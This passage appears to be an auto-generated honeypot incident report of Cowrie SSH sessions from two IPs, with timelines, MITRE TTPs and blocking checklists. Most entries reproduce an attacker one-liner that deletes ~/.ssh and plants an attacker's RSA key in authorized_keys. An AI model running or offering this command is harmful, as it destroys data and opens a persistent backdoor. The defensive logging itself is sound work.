| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:33:53` | `cowrie.session.connect` |
| `2026-06-13 08:33:53` | `cowrie.client.version` |
| `2026-06-13 08:33:53` | `cowrie.client.kex` |
| `2026-06-13 08:33:53` | `cowrie.login.success` |
| `2026-06-13 08:33:53` | `cowrie.session.params` |
| `2026-06-13 08:33:53` | `cowrie.command.input` |
| `2026-06-13 08:33:53` | `cowrie.command.failed` |
| `2026-06-13 08:33:53` | `cowrie.log.closed` |
| `2026-06-13 08:33:53` | `cowrie.session.params` |
| `2026-06-13 08:33:53` | `cowrie.command.input` |
| `2026-06-13 08:33:53` | `cowrie.session.file_download` |
| `2026-06-13 08:33:53` | `cowrie.log.closed` |
| `2026-06-13 08:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd877a79035a

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:33 |
| **Last Seen** | 2026-06-13 08:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:33:55` | `cowrie.session.connect` |
| `2026-06-13 08:33:55` | `cowrie.client.version` |
| `2026-06-13 08:33:55` | `cowrie.client.kex` |
| `2026-06-13 08:33:55` | `cowrie.login.success` |
| `2026-06-13 08:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c82d128638

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:40 |
| **Last Seen** | 2026-06-13 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:40:19` | `cowrie.session.connect` |
| `2026-06-13 08:40:19` | `cowrie.client.version` |
| `2026-06-13 08:40:19` | `cowrie.client.kex` |
| `2026-06-13 08:40:19` | `cowrie.login.success` |
| `2026-06-13 08:40:19` | `cowrie.session.params` |
| `2026-06-13 08:40:19` | `cowrie.command.input` |
| `2026-06-13 08:40:19` | `cowrie.command.failed` |
| `2026-06-13 08:40:19` | `cowrie.log.closed` |
| `2026-06-13 08:40:19` | `cowrie.session.params` |
| `2026-06-13 08:40:19` | `cowrie.command.input` |
| `2026-06-13 08:40:19` | `cowrie.session.file_download` |
| `2026-06-13 08:40:19` | `cowrie.log.closed` |
| `2026-06-13 08:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fbe7c0ac996

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:40 |
| **Last Seen** | 2026-06-13 08:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:40:20` | `cowrie.session.connect` |
| `2026-06-13 08:40:20` | `cowrie.client.version` |
| `2026-06-13 08:40:20` | `cowrie.client.kex` |
| `2026-06-13 08:40:20` | `cowrie.login.success` |
| `2026-06-13 08:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-963c1d79c113

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:42 |
| **Last Seen** | 2026-06-13 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:42:07` | `cowrie.session.connect` |
| `2026-06-13 08:42:07` | `cowrie.client.version` |
| `2026-06-13 08:42:07` | `cowrie.client.kex` |
| `2026-06-13 08:42:08` | `cowrie.login.success` |
| `2026-06-13 08:42:08` | `cowrie.session.params` |
| `2026-06-13 08:42:08` | `cowrie.command.input` |
| `2026-06-13 08:42:08` | `cowrie.command.failed` |
| `2026-06-13 08:42:08` | `cowrie.log.closed` |
| `2026-06-13 08:42:08` | `cowrie.session.params` |
| `2026-06-13 08:42:08` | `cowrie.command.input` |
| `2026-06-13 08:42:08` | `cowrie.session.file_download` |
| `2026-06-13 08:42:08` | `cowrie.log.closed` |
| `2026-06-13 08:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bcba2c59361

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:42 |
| **Last Seen** | 2026-06-13 08:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:42:09` | `cowrie.session.connect` |
| `2026-06-13 08:42:09` | `cowrie.client.version` |
| `2026-06-13 08:42:09` | `cowrie.client.kex` |
| `2026-06-13 08:42:09` | `cowrie.login.success` |
| `2026-06-13 08:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b6f64aa870

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:45 |
| **Last Seen** | 2026-06-13 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:45:30` | `cowrie.session.connect` |
| `2026-06-13 08:45:30` | `cowrie.client.version` |
| `2026-06-13 08:45:30` | `cowrie.client.kex` |
| `2026-06-13 08:45:30` | `cowrie.login.success` |
| `2026-06-13 08:45:30` | `cowrie.session.params` |
| `2026-06-13 08:45:30` | `cowrie.command.input` |
| `2026-06-13 08:45:30` | `cowrie.command.failed` |
| `2026-06-13 08:45:30` | `cowrie.log.closed` |
| `2026-06-13 08:45:30` | `cowrie.session.params` |
| `2026-06-13 08:45:30` | `cowrie.command.input` |
| `2026-06-13 08:45:31` | `cowrie.session.file_download` |
| `2026-06-13 08:45:31` | `cowrie.log.closed` |
| `2026-06-13 08:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf9eef9f516

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:45 |
| **Last Seen** | 2026-06-13 08:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:45:32` | `cowrie.session.connect` |
| `2026-06-13 08:45:32` | `cowrie.client.version` |
| `2026-06-13 08:45:32` | `cowrie.client.kex` |
| `2026-06-13 08:45:32` | `cowrie.login.success` |
| `2026-06-13 08:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76186e6705e9

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:46 |
| **Last Seen** | 2026-06-13 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:46:40` | `cowrie.session.connect` |
| `2026-06-13 08:46:40` | `cowrie.client.version` |
| `2026-06-13 08:46:40` | `cowrie.client.kex` |
| `2026-06-13 08:46:40` | `cowrie.login.success` |
| `2026-06-13 08:46:40` | `cowrie.session.params` |
| `2026-06-13 08:46:40` | `cowrie.command.input` |
| `2026-06-13 08:46:40` | `cowrie.command.failed` |
| `2026-06-13 08:46:40` | `cowrie.log.closed` |
| `2026-06-13 08:46:40` | `cowrie.session.params` |
| `2026-06-13 08:46:40` | `cowrie.command.input` |
| `2026-06-13 08:46:40` | `cowrie.session.file_download` |
| `2026-06-13 08:46:40` | `cowrie.log.closed` |
| `2026-06-13 08:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ae9ffae590

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:46 |
| **Last Seen** | 2026-06-13 08:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:46:41` | `cowrie.session.connect` |
| `2026-06-13 08:46:41` | `cowrie.client.version` |
| `2026-06-13 08:46:41` | `cowrie.client.kex` |
| `2026-06-13 08:46:41` | `cowrie.login.success` |
| `2026-06-13 08:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19feb2586947

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:49 |
| **Last Seen** | 2026-06-13 08:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:49:22` | `cowrie.session.connect` |
| `2026-06-13 08:49:22` | `cowrie.client.version` |
| `2026-06-13 08:49:22` | `cowrie.client.kex` |
| `2026-06-13 08:49:22` | `cowrie.login.success` |
| `2026-06-13 08:49:22` | `cowrie.session.params` |
| `2026-06-13 08:49:22` | `cowrie.command.input` |
| `2026-06-13 08:49:22` | `cowrie.command.failed` |
| `2026-06-13 08:49:22` | `cowrie.log.closed` |
| `2026-06-13 08:49:22` | `cowrie.session.params` |
| `2026-06-13 08:49:22` | `cowrie.command.input` |
| `2026-06-13 08:49:22` | `cowrie.session.file_download` |
| `2026-06-13 08:49:22` | `cowrie.log.closed` |
| `2026-06-13 08:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a188cad13d7b

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:49 |
| **Last Seen** | 2026-06-13 08:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:49:23` | `cowrie.session.connect` |
| `2026-06-13 08:49:23` | `cowrie.client.version` |
| `2026-06-13 08:49:23` | `cowrie.client.kex` |
| `2026-06-13 08:49:23` | `cowrie.login.success` |
| `2026-06-13 08:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b367d916145

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:50 |
| **Last Seen** | 2026-06-13 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:50:32` | `cowrie.session.connect` |
| `2026-06-13 08:50:32` | `cowrie.client.version` |
| `2026-06-13 08:50:32` | `cowrie.client.kex` |
| `2026-06-13 08:50:32` | `cowrie.login.success` |
| `2026-06-13 08:50:32` | `cowrie.session.params` |
| `2026-06-13 08:50:32` | `cowrie.command.input` |
| `2026-06-13 08:50:32` | `cowrie.command.failed` |
| `2026-06-13 08:50:32` | `cowrie.log.closed` |
| `2026-06-13 08:50:32` | `cowrie.session.params` |
| `2026-06-13 08:50:32` | `cowrie.command.input` |
| `2026-06-13 08:50:32` | `cowrie.session.file_download` |
| `2026-06-13 08:50:32` | `cowrie.log.closed` |
| `2026-06-13 08:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac88c6ed3aa

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:50 |
| **Last Seen** | 2026-06-13 08:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:50:33` | `cowrie.session.connect` |
| `2026-06-13 08:50:33` | `cowrie.client.version` |
| `2026-06-13 08:50:33` | `cowrie.client.kex` |
| `2026-06-13 08:50:33` | `cowrie.login.success` |
| `2026-06-13 08:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50057c3186a

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:52 |
| **Last Seen** | 2026-06-13 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:52:29` | `cowrie.session.connect` |
| `2026-06-13 08:52:29` | `cowrie.client.version` |
| `2026-06-13 08:52:29` | `cowrie.client.kex` |
| `2026-06-13 08:52:29` | `cowrie.login.success` |
| `2026-06-13 08:52:30` | `cowrie.session.params` |
| `2026-06-13 08:52:30` | `cowrie.command.input` |
| `2026-06-13 08:52:30` | `cowrie.command.failed` |
| `2026-06-13 08:52:30` | `cowrie.log.closed` |
| `2026-06-13 08:52:30` | `cowrie.session.params` |
| `2026-06-13 08:52:30` | `cowrie.command.input` |
| `2026-06-13 08:52:30` | `cowrie.session.file_download` |
| `2026-06-13 08:52:30` | `cowrie.log.closed` |
| `2026-06-13 08:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e647ad32e6e

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:52 |
| **Last Seen** | 2026-06-13 08:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:52:31` | `cowrie.session.connect` |
| `2026-06-13 08:52:31` | `cowrie.client.version` |
| `2026-06-13 08:52:31` | `cowrie.client.kex` |
| `2026-06-13 08:52:31` | `cowrie.login.success` |
| `2026-06-13 08:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d90536dcf9d

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:56 |
| **Last Seen** | 2026-06-13 08:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:56:23` | `cowrie.session.connect` |
| `2026-06-13 08:56:23` | `cowrie.client.version` |
| `2026-06-13 08:56:23` | `cowrie.client.kex` |
| `2026-06-13 08:56:23` | `cowrie.login.success` |
| `2026-06-13 08:56:23` | `cowrie.session.params` |
| `2026-06-13 08:56:23` | `cowrie.command.input` |
